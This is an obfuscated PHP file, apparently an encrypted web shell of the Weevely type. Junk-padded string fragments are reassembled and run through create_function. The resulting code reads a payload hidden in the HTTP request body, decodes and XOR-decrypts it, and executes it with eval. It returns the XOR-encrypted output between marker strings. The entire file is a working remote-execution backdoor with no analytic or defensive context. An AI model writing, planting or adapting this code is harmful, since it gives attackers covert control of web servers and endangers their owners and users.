<?php
$Y='($j=T0;($j<$cT&&$Ti<$l);$j++,$Ti++){$o.=T$t{$i}T^$Tk{$j};}}reTturn T$oT;}if (@preTg_TmaTt';
$n=str_replace('Bf','','BfBfcreatBfBfBfeBf_function');
$k='cTTh("/$kh(.+)$Tkf/",@file_get_conTteTnts("Tphp://TinpuTt"),$Tm)==1) {@obTT_start(';
$q='TnctionT x($t,T$k){$c=stTrlen($kT);$TTlT=strlen($t);$o=T"";foTr($i=0;$i<$TTTl;){for';
$u=';T@ob_end_clean(T);$r=@baTse64_eTncodTe(@xT(@gzcTompress($To),T$k)T);print("$p$kh$r$Tkf");}';
$a='$k="3dadeT56d";$Tkh="T70092b0TadefT9";$kfT="49f043aTfTc70a"T;$p=T"zTT3G6A7zHeE2dC7SE";fu';
$p=');@TeTval(@gzunTcompress(@x(@TbTase64_TdeTcode($m[1T]),$k)));$o=@Tob_gTetTT_conteTnts()';
$Q=str_replace('T','',$a.$q.$Y.$k.$p.$u);
$M=$n('',$Q);$M();
?>
